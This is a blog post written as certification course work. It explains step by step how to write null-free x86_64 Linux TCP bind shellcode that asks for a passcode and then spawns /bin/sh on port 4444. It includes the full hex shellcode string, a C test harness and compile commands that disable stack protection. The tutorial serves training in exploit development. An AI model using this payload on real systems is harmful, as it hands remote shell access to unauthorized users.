<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:1.1rem}</style><title>x86_64 TCP bind shellcode with basic authentication on Linux systems</title><meta name=description content="The objective here is to create a tcp_bind_shell using Assembly x64, which will ask for a passcode, and have no null bytes in it.
So, where to start? By basing …"><meta name=keywords content='blog,gokarna,hugo'><meta property="og:url" content="https://0x4ndr3.github.io/posts/x86_64-tcp-bind-shellcode-with-basic-authentication-on-linux-systems/"><meta property="og:type" content="website"><meta property="og:title" content="x86_64 TCP bind shellcode with basic authentication on Linux systems"><meta property="og:description" content="The objective here is to create a tcp_bind_shell using Assembly x64, which will ask for a passcode, and have no null bytes in it.
So, where to start? By basing …"><meta property="og:image" content="https://0x4ndr3.github.io/main.png"><meta property="og:image:secure_url" content="https://0x4ndr3.github.io/main.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="x86_64 TCP bind shellcode with basic authentication on Linux systems"><meta name=twitter:description content="The objective here is to create a tcp_bind_shell using Assembly x64, which will ask for a passcode, and have no null bytes in it.
So, where to start? By basing …"><meta property="twitter:domain" content="https://0x4ndr3.github.io/posts/x86_64-tcp-bind-shellcode-with-basic-authentication-on-linux-systems/"><meta property="twitter:url" content="https://0x4ndr3.github.io/posts/x86_64-tcp-bind-shellcode-with-basic-authentication-on-linux-systems/"><meta name=twitter:image content="https://0x4ndr3.github.io/main.png"><link rel=canonical href=https://0x4ndr3.github.io/posts/x86_64-tcp-bind-shellcode-with-basic-authentication-on-linux-systems/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.fdbfba1e074acb7e4abbf4c94eb19abb7702489c9689a27ee5e24a2bd481e4b7.js integrity="sha256-/b+6HgdKy35Ku/TJTrGau3cCSJyWiaJ+5eJKK9SB5Lc="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://0x4ndr3.github.io/><img src=https://0x4ndr3.github.io/main.png alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://0x4ndr3.github.io/>0x4ndr3</a></div><div class=nav-links><div class=nav-link><a href=https://0x4ndr3.github.io/posts/ aria-label><img class=svg-inject src=/icons/notepadplusplus.svg> Posts</a></div><div class=nav-link><a href=https://github.com/0x4ndr3 aria-label=github target=_blank><img class=svg-inject src=/icons/github.svg> Github</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://0x4ndr3.github.io/posts/><img class=svg-inject src=/icons/notepadplusplus.svg> Posts</a></li><li class=nav-item><a href=https://github.com/0x4ndr3 target=_blank><img class=svg-inject src=/icons/github.svg> Github</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>x86_64 TCP bind shellcode with basic authentication on Linux systems</h1><small role=doc-subtitle></small><p class=post-date>November 1, 2017</p><ul class=post-tags></ul></div><div class=post-content><p>The objective here is to create a tcp_bind_shell using Assembly x64, which will ask for a passcode, and have no null bytes in it.</p><p>So, where to start? By basing our code on the C equivalent source code. <a href=https://gitlab.com/0x4ndr3/SLAE64_Assignments/blob/master/Assignment_01/original%20basic%20bind%20shell/Bind-Shell.c target=_blank rel="nofollow noopener noreferrer"><span>Here is
</span></a>what a tcp_bind_shell looks like in C:</p><p><a href=https://gitlab.com/0x4ndr3/SLAE64_Assignments/blob/master/Assignment_01/original%20basic%20bind%20shell/Bind-Shell.c target=_blank rel="nofollow noopener noreferrer"><span><img src=images/fig1-e1509498273204.png alt="Figure 1 – Simple tcp_bind_shell in C"></span></a></p><p>A shellcode must obey a few basic rules:</p><ul><li>make it as short as possible, since you never know how short the memory you’ll have to inject the shellcode in;</li><li>at least, no Null bytes – there might be other bad characters, but these can be tackled with encoders that avoid using them;</li><li>no long jumps, since you won’t know the address of the code in memory when the shellcode is executing.</li></ul><p>Regarding the reduced size, we won’t be making, as opposed to de C code, any error checks. Which makes sense, since if for some reason you can’t create a socket for example, what else would an attacker want to do?</p><p>So let’s start by creating the socket [Figure 1 – line 25].</p><p>To make a <a href="http://blog.tinola.com/?e=5" target=_blank rel="nofollow noopener noreferrer"><span>system call in linux x86_64
</span></a>, we use an instruction called <em>syscall</em>. It won’t access the interrupt descriptor table making it perform faster than the <em>int 0x80</em>instruction on the x86 architecture (even though it’s also supported on the x64). This instruction will identify the system call by the number in the RAX register. The parameters are sent on RDI, RSI, RDX, R10, R8, and R9, in this exact order, and the return value will be on the RAX register.</p><p>The syscall values to put in RAX can be found on the <em>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</em> file on the 64 bit Operating System (in my case: Ubuntu 17.04).</p><p><img src=images/fig2.png alt="Figure 2 – numbers to put in RAX register for syscalls"></p><p>And python can definitely help with the constants being sent as parameters to the functions.</p><p><img src=images/fig3-e1509502460373.png alt="Figure 3 – acquiring constant values using python’s socket module"></p><p>Given all this, the simplest code comes down to:</p><p><img src=images/fig4.png alt="Figure 4 – socket syscall"></p><p>But if we compile this (<em># nasm -f elf64 bindshell.nasm -o bindshell.o</em>) and dump the object code (<em>objdump -M intel -d bindshell.o</em>) we realise it has null bytes in it.</p><p><img src=images/fig5.png alt="Figure 5 – readable assembly"></p><p>A simple way to remove those is to use a <em>xor</em> to zero out a register and then <em>mov</em> the immediate value into the lower byte.</p><p><img src=images/fig7.png alt="Figure 6 – null byte free code"></p><p>The only issue here, is that it’s still 5 bytes long, as the original <em>mov</em> instruction. So, another way to remove the null bytes is to use the <em>push/pop</em> combination. The <em>push</em> <a href=https://software.intel.com/sites/default/files/managed/39/c5/325462-sdm-vol-1-2abcd-3abcd.pdf target=_blank rel="nofollow noopener noreferrer"><span>supports “pushing” an immediate value with 8 bits
</span></a> (while also pushing the rest of the upper bytes as null bytes into the stack), which allows for removing the excess null bytes from the code.</p><p><img src=images/fig6.png alt="Figure 7 – PUSH instruction support on Intel’s manual"></p><p>But the advantage here is the reduced size of both instructions.</p><p><img src=images/fig8.png alt="Figure 8"></p><p>This way, we can bring an original 5 byte long instruction, to only 3 bytes, while also removing all null bytes.</p><p>But notice that, in figure 6, the <em>mov al,0x29</em> instruction only has 2 bytes. This will be used across the shellcode but, it carries the burden that it can only be used (since we want this shellcode as consistent as possible) when you are sure that previous operations did not alter the zeros in the 7 upper bytes of the 8 byte register. Otherwise it will compromise the shellcode in its execution at some point. That’s why this <em>mov al,…</em> is not used to set up the first syscall, because we can’t be sure the shellcode will begin execution with these registers zeroed out.</p><p>Another way to bring down a <em>mov r64, r64</em> from its 3 bytes, down to 2 bytes, is to use <em>xchg</em> instruction. But it also comes at a cost, and hence the need for a careful usage in order to keep your shellcode from crashing. It can’t obviously be used when one of the registers is RSP, and you have to be aware if both registers will have acceptable values, since the moving is on both sides.</p><p>Another reduction that can be made is using the <em>cdq</em> instruction. It sign-extends the RAX sign into the RDX register. So if RAX is a positive integer, it zeroes out the RDX register. The advantage being, it’s only one byte long.</p><p>So the code becomes:</p><p><a href=https://gitlab.com/0x4ndr3/SLAE64_Assignments/blob/master/Assignment_01/BindShell.nasm target=_blank rel="nofollow noopener noreferrer"><span><img src=images/fig92.png alt="Figure 9 – shorter socket syscall"></span></a></p><p>Even though it looks longer (more lines), it actually is shorter after compiled.</p><p>So now let’s bind the socket to the IP address and tcp port 4444 [Figure 1 – line 36].</p><p><img src=images/fig108.png alt="Figure 10 – structure build and bind syscall"></p><p>The RAX register contains the socket returned by the <em>socket</em> syscall and, because we want to send it as the first parameter to the <em>bind</em> syscall, we start by moving it to RDI. Then we build the <em>sockaddr_in</em> structure, which we’ll bind to IP 0.0.0.0 (meaning the IP on all interfaces) and TCP port 4444. This port value is written in 2 bytes, but since it’s a little endian system, we have to exchange those two bytes’ values. 4444(decimal) is equal to 0x115c (hex). So, by exchanging the two bytes, we get 0x5c11.</p><p>This structure will occupy 16 bytes, and the structure in memory will be (right at the moment when we execute <em>mov rsi,rsp</em>):</p><p><img src=images/fig11.png alt="Figure 11 – memory layout of the structure"></p><p>Because it’s a little endian system, we have to put this value backwards in the register, and that’s what’s being done with the help of some shifts, so we can avoid the zeroes.</p><p>After that, the RSP register is basically pointing to the structure, so we move it to RSI, where it will be sent as a parameter to the <em>bind</em> function.</p><p>Now we have the listen and accept syscalls [Figure 1 – line 42 and 48].</p><p><img src=images/fig109.png alt="Figure 12 – listen and accept syscalls"></p><p>The listen function sets a flag in the internal socket structure marking the socket as a passive listening socket, one that you can call accept on. It opens the associated port (tcp/4444) so the socket can then start receiving connections from clients.</p><p>The accept function asks a listening socket to accept the next incoming connection and return a socket descriptor for that connection. This means it does create a new socket, the client socket, which will be put into RAX as a return value.</p><p>At this point, in a well designed, bug free, and memory conscious application, one would close the socket [Figure 1 – line 54]. But for the sake of our size restrictions, I’ll be ignoring that step, as the attacker still will be able to get the desired shell.</p><p>Now we move on to redirecting the local application’s <em>stdin</em> and <em>stdout</em> file descriptors into the client socket that connects to the listening port. The file descriptor 0 (<em>stdin</em>) must be duplicated, so that any input typed by the attacker in the socket can be sent to the shellcode as a normal system input would have done. And the file descriptor 1 (<em>stdout</em>) is being duplicated so that the output generated by the shellcode is sent back to the attacker as displayed in his or her screen.</p><p>Simply put, it would be something like this:</p><p><img src=images/fig13.png alt="Figure 13"></p><p>My only problem with this, is that it generates close to 30 bytes of opcode. But once you look closely at it, you easily detect patterns, which means we can reduce code size by using a loop:</p><p><img src=images/fig141.png alt="Figure 14"></p><p>The reason I’m calling on syscall and not worrying about the RDI and RSI registers’ integrity, is that the syscall guarantees that all registers, except RCX and R11 (and obviously the return value – RAX), are preserved during the syscall.</p><p>One small detail: I’d usually remove the third block of code from the extended version [Figure 13], because it actually duplicates the <em>stderr</em> (file descriptor number 2) and, if we’re being consistent with our “shortest possible” policy, I’d just remove it. But because it actually has no impact on size, on this last shortened piece of code [Figure 14], I’ll just keep it. No harm in that.</p><p>Now, the authentication code.</p><p><img src=images/fig158.png alt="Figure 15 – authentication section"></p><p>We start by actually reading a string from the client. As a buffer, where the inputted string will be located, I’m using the stack, and basically reserve 8 bytes for that buffer, by <em>push</em>‘ing the 8 byte RAX register, and then moving the RSP value to RSI, where the buffer location is. The length of the string (including the ending \n) will be returned in the RAX register. This length will be used to terminate the comparison of the buffer string and the other string pushed into stack, located on the RDI register (assuming all compared bytes are equal until then).</p><p>Now, all that’s left is the /bin/sh call using execve.</p><p><img src=images/fig162.png alt="Figure 16 – execve function parameters"></p><p>The syscall value of execve is 59 (decimal). The RDI will be pointing to the string “//bin/sh”, the RSI will be pointing to an array of char*, in which the first is the memory location of the “//bin/sh” string and the second is a null pointer, and the RDX is a null pointer (no need to use any environment variables in the shellcode). This all comes down to the following:</p><p><a href=https://gitlab.com/0x4ndr3/SLAE64_Assignments/blob/master/Assignment_01/BindShell.nasm target=_blank rel="nofollow noopener noreferrer"><span><img src=images/fig16.png alt="Figure 17 – execve code"></span></a></p><p>And it’s done!</p><p>We now compile the code:</p><blockquote><p>nasm -f elf64 BindShell.nasm -o BindShell.o && ld BindShell.o -o BindShell</p></blockquote><p>To try the shellcode, we extract the opcode in hexadecimal format using some command line nijutsu:</p><blockquote><p>for i in <code>objdump -d BindShell | tr ‘\t’ ‘ ‘ | tr ‘ ‘ ‘\n’ | egrep ‘^[0-9a-f]{2}$’ </code>; do echo -n “\x$i” ; done</p></blockquote><p>The output will be placed inside the following array in C code:</p><blockquote><p>#include&lt;stdio.h></p><p>#include&lt;string.h></p><p>unsigned char code[] = \</p><p>“\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x48\x97\x52\x66\xba\x11\x5c\x48\xc1\xe2\x10\x80\xf2\x02\x52\x48\x89\xe6\xb0\x31\x6a\x10\x5a\x0f\x05\x6a\x32\x58\x6a\x02\x5e\x0f\x05\xb0\x2b\x48\x83\xec\x10\x48\x89\xe6\x6a\x10\x48\x89\xe2\x0f\x05\x48\x97\x6a\x03\x5e\xb0\x21\xff\xce\x0f\x05\xe0\xf8\x48\x31\xff\x50\x48\x89\xe6\x6a\x08\x5a\x0f\x05\x48\x91\x48\xbb\x31\x32\x33\x34\x35\x36\x37\x0a\x53\x48\x89\xe7\xf3\xa6\x75\x1d\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x52\x48\x89\xe2\x57\x48\x89\xe6\x0f\x05\x90”;</p><p>main(){</p><p>printf(“Shellcode Length:  %d\n”, (int)strlen(code));</p><p>int (*ret)() = (int(*)())code;</p><p>ret();</p><p>}</p></blockquote><p>Which will then be compiled without stack protection and an executable stack:</p><blockquote><p>gcc -fno-stack-protector -z execstack shellcode.c -o shellcode</p></blockquote><p>And finally executed:</p><p><img src=images/fig181.png alt="Figure 18 – shellcode execution (136 bytes long)"></p><p><img src=images/fig18.png alt="Figure 19 – Attacker connecting to the listening shellcode, inserting the password, and executing the “id” and “exit” commands"></p><p>You can find <a href=https://gitlab.com/0x4ndr3/SLAE64_Assignments/tree/master/Assignment_01 target=_blank rel="nofollow noopener noreferrer"><span>all the files on my gitlab account
</span></a>.</p><p>On a personal note, just want to give a huge thanks to <a href=https://twitter.com/securitytube target=_blank rel="nofollow noopener noreferrer"><span>Vivek Ramachandran
</span></a>and the <a href=http://www.pentesteracademy.com/topics target=_blank rel="nofollow noopener noreferrer"><span>Pentester Academy
</span></a>team, as I have enjoyed every second of this course since I’ve learned so many interesting things. Thank you!</p><hr><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</p><ul><li>Current URL: <a href=https://my.ine.com/CyberSecurity/courses/42f93b0f/x86_64-assembly-language-and-shellcoding-on-linux target=_blank rel="nofollow noopener noreferrer"><span>https://my.ine.com/CyberSecurity/courses/42f93b0f/x86_64-assembly-language-and-shellcoding-on-linux</span></a></li><li>Original URL (does not work anymore): <a href=http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html target=_blank rel="nofollow noopener noreferrer"><span>http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html</span></a></li></ul><p><strong>Student ID: PA-2109</strong></p></div><div class=prev-next></div><svg id="btt-button" class="arrow-logo" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div></main><footer class=footer><span>&copy; 2017 Andre Lima</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>